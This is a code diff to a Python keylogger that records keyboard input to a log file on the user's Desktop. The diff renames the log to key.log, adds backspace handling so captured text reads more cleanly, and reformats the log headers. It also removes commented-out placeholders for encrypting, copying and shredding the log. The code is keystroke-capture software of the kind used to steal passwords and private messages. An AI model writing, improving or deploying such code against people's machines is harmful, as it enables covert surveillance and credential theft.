@@ -13,7 +13,7 @@ F = '0'
 # Directories
 home = str(os.path.expanduser('~'))
 # Files
-lgPath = (home+"/Desktop/test.log")
+lgPath = (home+"/Desktop/key.log")
 # End Globals
 
 # Class controls what keys are pressed on the keyboard
@@ -27,7 +27,6 @@ class KeyControl:
 	param log : str is the log file to be written
 	var keyString : [str] is the key pressed formatted between brackets
 	var wLine : str line that is to be written
-
 	"""
 	def sort_key(key):
 		global F,fullstr,wLine,lgPath
@@ -53,6 +52,13 @@ class KeyControl:
 				# Appends Shift to fullstr
 				elif keyString == ("[SHIFT]"):
 					pass
+
+				# Handles backspace
+				elif keyString == ("[BACKSPACE]"):
+					try:
+						fullstr.pop(len(fullstr)-1)
+					except:
+						pass
 
 				# Handles Caps (on/off) and appends to logfile appropriately
 				elif keyString == ("[CAPS_LOCK]"):
@@ -84,12 +90,10 @@ class KeyControl:
 # Class controls the logs
 class LogControl:
 	"""
-
 	Checks the directories for validity in the given path
 	param path : str is the full path thats being split and tested
 	var testPath : str is a temporary path made to be tested and built
 	var pathSplit : list is a list with individual paths in them
-
 	"""
 	def dirCheck(path):
 		# Does not support relative paths.
@@ -103,12 +107,10 @@ class LogControl:
 				os.mkdir(testPath)
 
 	"""
-
 	Writes a captured line to the file
 	param lgPath : str is the full path where the log is kept
 	param wLine : str is the line that is to be written
 	var logFile : File is the log file being written to
-
 	"""
 	def writeLine(lgPath,wLine):
 		try:
@@ -118,44 +120,45 @@ class LogControl:
 			logFile.close()
 
 	"""
-
 	Initialize the log file
 	param logOP : int is mode of operation for this function
 	param lgPath : str is the full path where the log is kept
 	var logFile : File is the log file being written to
-
 	"""
 	def initializeLog(logOP,lgPath):
+
 		# If logging is being destroyed (-1) then destroy log
 		if logOP == -1:
 			try:
 				logFile = open(lgPath,"a")
 			finally:
-				logFile.write(str(datetime.datetime.now().strftime(("-"*16)+"\n[--] Log Destroyed\n[%m/%d/%Y]:[%H:%M:%S]\n")+("-"*16)))
+				logFile.write(str(datetime.datetime.now().strftime("\n[--] Log Destroyed:[%m/%d/%Y]|[%H:%M:%S]\n")))
 				logFile.close()
-				#encrypt logfile and cpy
-				#os.cmd(shred logfile)
+
 		# If logging is ON/STARTING (1) then write the starting header
 		elif logOP == 1:
 			try:
 				logFile = open(lgPath,"a")
 			finally:
-				logFile.write(str(datetime.datetime.now().strftime(("-"*16)+"\n[+] Log Started\n[%m/%d/%Y]:[%H:%M:%S]\n"+("-"*16)+"\n\n")))
+				logFile.write(str(datetime.datetime.now().strftime("\n[+] Log Started:[%m/%d/%Y]|[%H:%M:%S]\n\n")))
 				logFile.close()
+
 		# If logging is OFF/ENDING (0) then write the ending header
 		elif logOP == 0:
 			try:
 				logFile = open(lgPath,"a")
 			finally:
-				logFile.write(str(datetime.datetime.now().strftime(("-"*16)+"\n[-] Log Ended\n[%m/%d/%Y]:[%H:%M:%S]\n"+("-"*16)+"\n")))
+				logFile.write(str(datetime.datetime.now().strftime("[-] Log Stopped:[%m/%d/%Y]|[%H:%M:%S]\n")))
 				logFile.close()
+
 		# If logging is BUILDING/CREATE (2) then build the log
 		elif logOP == 2:
 			try:
 				logFile = open(lgPath,"a")
 			finally:
-				logFile.write(str(datetime.datetime.now().strftime(("-"*16)+"\n[++] Log Created\n[%m/%d/%Y]:[%H:%M:%S]\n"+("-"*16)+"\n")))
+				logFile.write(str(datetime.datetime.now().strftime("\n[++] Log Created:[%m/%d/%Y]|[%H:%M:%S]\n")))
 				logFile.close()
+
 		# Else, fix the input given to intializeLog
 		else:
 			print ("Incorrect logIO option given in initializeLog()\nlogIO can only be 1 (start) 0 (stop) -1 (destroy) 2 (build).\n")
@@ -174,7 +177,7 @@ def __main__():
 			#with each key, run sort
 			l.join()
 	except:
-		print("\nSomething went wrong in __main__()")
+		print("\nInterrupted in __main__")
 		exit(0)
 	finally:
 		LogControl.initializeLog(0, lgPath)
